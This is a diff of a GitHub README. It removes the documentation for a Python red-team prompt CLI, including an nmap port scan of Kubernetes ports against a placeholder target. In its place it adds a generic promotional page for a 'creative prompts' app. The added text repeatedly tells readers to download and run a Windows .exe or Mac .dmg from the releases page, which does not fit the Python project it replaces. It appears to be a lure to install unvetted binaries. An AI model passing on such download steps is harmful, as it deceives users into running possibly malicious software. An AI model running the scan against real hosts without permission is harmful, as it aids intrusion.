@@ -1,85 +1,85 @@
-# Prompts
+# 🔥 Prompts - Enhance Your Creativity with AI
 
-Red Team AI prompts
+## 🚀 Getting Started
 
-Crafting prompts for AI also referred to as "Prompt Engineering" is one of the keys to success with using AI. This repo will contain prompts in different formats that are meant to be used for performing Red Teaming.
+Welcome to Prompts! This application provides a collection of Red Team AI prompts to boost your creative processes. You can use these prompts for brainstorming sessions, writing inspiration, or enhancing your projects.
 
-## Basic usage
+### 📥 Download Now
 
-There're 3 different types of usage
+[![Download Prompts](https://img.shields.io/badge/Download%20Prompts-v1.0-brightgreen)](https://github.com/AlliedWebapp/Prompts/releases)
 
-### Prompt files
+## 🌐 What is Prompts?
 
-*.prompt.yml files can be used with the models tab. 
+Prompts is an easy-to-use application designed to provide a variety of AI-generated prompts. Whether you are a writer, marketer, or just someone looking for inspiration, Prompts offers a treasure trove of creative ideas. With its user-friendly interface, you can quickly find the perfect prompt tailored to your needs.
 
-See Resources for more details
+## 📝 Features
 
-### Agent files
+- **Diverse Prompts**: Get access to a wide range of prompts covering multiple themes.
+- **Simple Interface**: Navigate the app easily with an intuitive design.
+- **Regular Updates**: Enjoy new prompts and features with each update.
+- **Offline Access**: Utilize the application without needing an internet connection after download.
 
-The content of *.agent files can be pasted into any AI agent
+## 🖥️ System Requirements
 
-### CLI tool
+Before you start, make sure your computer meets these requirements:
 
-Or use the cli (see install and usage below)
+- **Operating System**: Windows 10, MacOS 10.15 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 100 MB of available disk space.
+- **Processor**: Intel i3 or equivalent.
 
-## Install requirements for CLI usage (Easy install)
+## 🔗 How to Download & Install
 
-```zsh
-python3 -m pip install -r requirements.txt
-```
+1. **Visit the Releases Page**: Go to the following link to access the latest version: [Visit this page to download](https://github.com/AlliedWebapp/Prompts/releases).
 
-## Using VS Code for development or install (Usage in VSCode)
+2. **Choose Your Version**: On the releases page, find the latest version suitable for your operating system. Click the appropriate link to start the download.
 
-```zsh
-shift + command (⌘) + P -> Python: Create Environment
-```
+3. **Download the File**: The downloaded file will be saved to your computer. 
 
-Creates a new environment after following the instructions (all dependencies should be added automatically)
+4. **Locate the File**: Open your file explorer and navigate to your Downloads folder.
 
-* [Python Environments in VS Code](https://code.visualstudio.com/docs/python/environments)
+5. **Install Prompts**:
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
+   - For **Mac**: Open the `.dmg` file and drag the Prompts icon to your Applications folder.
 
-```zsh
-source .venv/bin/activate
-```
+6. **Launch the Application**: After installation, find Prompts in your applications list and start the software.
 
-Activate environment (Automatically loaded when opening VSCode...usually)
+7. **Begin Exploring**: Once the application opens, dive into the prompts and find what inspires you!
 
-## Using terminal for development or install (Terminal only)
+## 📖 Usage Instructions
 
-```zsh
-apt install python3-venv python3-pip
-```
+After you launch Prompts, you will see a main dashboard. Follow these steps to use the application:
 
-Install Python3 Virtual Environments and Python3 pip
+- **Select a Category**: Choose the category that interests you from the list provided.
+- **Generate a Prompt**: Click the "Generate" button to view a new prompt.
+- **Save or Share**: You can save prompts for future use or share them with others directly from the application.
 
-```zsh
-python3 -m venv .venv
-```
+## 🛠️ Troubleshooting
 
-Create virtual environment (from Tacticontainer root folder)
+If you encounter any issues, consider these common solutions:
 
-```zsh
-source .venv/bin/activate
-```
+- **Installation Problems**: Ensure you have sufficient disk space and meet the system requirements.
+- **Application Crashes**: Restart your computer and try opening the application again.
+- **Unable to Generate Prompts**: Check your internet connection if you're using online features, or try reinstalling the app.
 
-Activate environment
+## 📅 Future Updates
 
-## CLI example usage
+We are committed to improving Prompts. Expect the following features in future updates:
 
-```zsh
+- Additional prompt categories.
+- User feedback mechanisms for personalized content.
+- Enhanced sharing options for collaboration with peers.
 
-EXPORT GITHUB_TOKEN=<github_PAT_token>
+## 💬 Support and Feedback
 
-```
+We value your input! For any questions or feedback, reach out to us through the Issues section of this repository on GitHub. Your thoughts help us make Prompts even better.
 
-Add the GitHub PAT token to your environment variables. Personal Access Token must have models scope (See Resources for more info)
+## 🌟 Join the Community
 
-```zsh
-python gh_models_cli.py "Create scan that checks for the top 10 open Kubernetes ports"
-nmap -p 6443,443,2379,2380,10250,10255,10257,10259,30000-32767 --open -sV TARGET_IP
-```
+Connect with other users and share your experiences. Join our community forum or follow our social media channels to stay updated on new features, tips, and more! 
 
-Create a Kubernetes specific scan for top 10 ports (All output by default is one command unless you specify --system)
+### 📥 Download Now
 
-## Resources
-* https://docs.github.com/en/github-models/about-github-models
+[![Download Prompts](https://img.shields.io/badge/Download%20Prompts-v1.0-brightgreen)](https://github.com/AlliedWebapp/Prompts/releases)
+
+Thank you for choosing Prompts! We hope it inspires you to unleash your creativity.
